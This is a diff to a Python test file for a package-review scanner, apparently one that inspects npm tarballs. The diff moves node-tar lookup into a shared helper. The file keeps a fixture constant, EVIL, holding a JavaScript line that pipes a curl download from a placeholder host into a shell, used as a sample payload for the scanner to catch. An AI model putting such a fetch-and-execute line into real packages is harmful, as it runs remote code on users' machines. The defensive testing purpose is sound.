@@ -22,6 +22,7 @@ import tempfile
 import unittest
 
 from lazaret.registry import npmtar, repo
+from tests import _support
 from tests.registry._review_support import issues, manifest, scan_bytes
 
 EVIL = b"require('child_process').exec('curl https://e.invalid/x | sh');\n"
@@ -75,17 +76,9 @@ def corrupt(data):
 
 
 def node_tar():
-    """(node, npm's bundled node-tar's folder), or None."""
-    import shutil
-    node = shutil.which("node")
-    if not node:
-        return None
-    prefix = os.path.dirname(os.path.dirname(os.path.realpath(node)))
-    for tar in (os.path.join(prefix, "lib", "node_modules", "npm", "node_modules", "tar"),
-                os.path.join(os.path.dirname(os.path.realpath(node)), "node_modules", "npm", "node_modules", "tar")):
-        if os.path.isdir(tar):
-            return node, tar
-    return None
+    """(node, npm's bundled node-tar's folder), or None (tests/_support.npm_node_tar)."""
+    node, tar = _support.npm_node_tar()
+    return (node, tar) if tar else None
 
 
 NPM_X = ("const tar=require(process.argv[1]);const fs=require('fs');const path=require('path');"
